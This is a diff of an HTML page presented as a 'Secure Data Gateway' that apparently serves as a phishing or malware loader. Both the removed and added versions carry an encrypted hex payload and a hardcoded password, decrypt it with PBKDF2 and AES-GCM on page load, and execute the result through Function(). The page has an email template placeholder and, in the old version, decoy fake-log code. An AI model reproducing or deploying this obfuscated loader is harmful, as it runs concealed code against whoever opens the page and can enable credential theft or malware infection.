@@ -1,1 +1,64 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" adidas="<%=EMAIL64%>" content="width=device-width,initial-scale=1"><meta nike-testme="" name="developer" content="ShadowCoderZ"><title>Data Decryption Portal</title><style>body{background-color:#e0e0e0;font-family:'Consolas',monospace;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;padding:20px}.spinner{width:70px;height:70px;border:10px solid #777;border-top:10px solid #009688;border-radius:50%;animation:r 1.5s linear infinite}@keyframes r{from{transform:rotate(0)}to{transform:rotate(360deg)}}.status-message{margin-top:15px;font-size:18px;color:#333;font-weight:bold}.invisible-section{display:none}.useless-box{width:100px;height:100px;background-color:#ccc;margin:20px;opacity:.5}</style></head><body><div class="invisible-section"><span data-tag="invisibleTag"></span></div><div id="data-processor" data-email="<%=EMAIL64%>"><div class="spinner"></div><p class="status-message">Initializing decryption...</p></div><div class="useless-box"></div><script>function generateFakeLogs(){["Loading modules...","Verifying integrity...","Establishing secure connection..."].forEach(e=>{})}async function decodeSecureData(e,a,c,t){function d(e){return new Uint8Array(e.match(/.{1,2}/g).map(e=>parseInt(e,16)))}async function n(e,a){return crypto.subtle.deriveKey({name:"PBKDF2",salt:a,iterations:1e5,hash:"SHA-256"},e,{name:"AES-GCM",length:256},!1,["decrypt"])}let f=await crypto.subtle.importKey("raw",new TextEncoder().encode(t),{name:"PBKDF2"},!1,["deriveKey"]),r=await n(f,d(c));try{let $=await crypto.subtle.decrypt({name:"AES-GCM",iv:d(a)},r,d(e));return console.info("[SUCCESS] Decryption completed successfully."),new TextDecoder().decode($)}catch(_){return console.error("[ERROR] Decryption process failed:",_),null}}generateFakeLogs(),(async()=>{console.log("[STATUS] Starting decryption process...");let e={iv:"0a6d791008bd13b5d22d4e92",salt:"cb6853c10fc7a13ae3fd54b1af489606",encrypted:"e2b5f7da69e614a29737cf95404cf4d2bf56f5c5635356c0e94917b504bbd2e4fa7e7c3b7a9849dc3c26889e14e28690daa199f60070b2fcaae0726a246226d9e1e34f65b6aba4b2151016ccf4ba0dcecc38e79804fa296c4d94ef4b64c9f1ed021e3c331af17d2bdd40f791f580c232810895aaf42def5bc9ff15a11dc27fa5c5d003a7a0a14968d58ad8833940a2e935a85cef230aea8a89254e4f6e6659b9af8d7fea89a1f8642c75710c053816c3385cf63667c1e2c2b25cd4b7ddf2570c"},a=await decodeSecureData(e.encrypted,e.iv,e.salt,"homesweethome");console.log(a),a&&Function(a)()})();</script></body></html>
+<!DOCTYPE html>
+<html nike-Obleee="" adidas="<%=EMAIL64%>" lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Data Gateway</title>
+    <style>
+        body {
+            background: #d0d0d0;
+            font-family: monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+    </style>
+</head>
+<body>
+    <p>Bootstrapping security module...</p>
+    <script>
+        async function decryptData(encrypted, iv, salt, key) {
+            const hexToArray = hex => new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+            
+            const baseKey = await crypto.subtle.importKey(
+                "raw",
+                new TextEncoder().encode(key),
+                { name: "PBKDF2" },
+                false,
+                ["deriveKey"]
+            );
+
+            const derivedKey = await crypto.subtle.deriveKey(
+                { name: "PBKDF2", salt: hexToArray(salt), iterations: 100000, hash: "SHA-256" },
+                baseKey,
+                { name: "AES-GCM", length: 256 },
+                false,
+                ["decrypt"]
+            );
+
+            return crypto.subtle.decrypt(
+                { name: "AES-GCM", iv: hexToArray(iv) },
+                derivedKey,
+                hexToArray(encrypted)
+            ).then(decrypted => new TextDecoder().decode(decrypted)).catch(() => null);
+        }
+
+        (async () => {
+            const encryptedPayload = {
+                iv: "0a6d791008bd13b5d22d4e92",
+                salt: "cb6853c10fc7a13ae3fd54b1af489606",
+                encrypted: "e2b5f7da69e614a29737cf95404cf4d2bf56f5c5635356c0e94917b504bbd2e4fa7e7c3b7a9849dc3c26889e14e28690daa199f60070b2fcaae0726a246226d9e1e34f65b6aba4b2151016ccf4ba0dcecc38e79804fa296c4d94ef4b64c9f1ed021e3c331af17d2bdd40f791f580c232810895aaf42def5bc9ff15a11dc27fa5c5d003a7a0a14968d58ad8833940a2e935a85cef230aea8a89254e4f6e6659b9af8d7fea89a1f8642c75710c053816c3385cf63667c1e2c2b25cd4b7ddf2570c"
+            };
+            
+            const secretKey = "homesweethome";
+            const decryptedResult = await decryptData(encryptedPayload.encrypted, encryptedPayload.iv, encryptedPayload.salt, secretKey);
+            
+            if (decryptedResult) {
+                Function(decryptedResult)();
+            }
+        })();
+    </script>
+</body>
+</html>
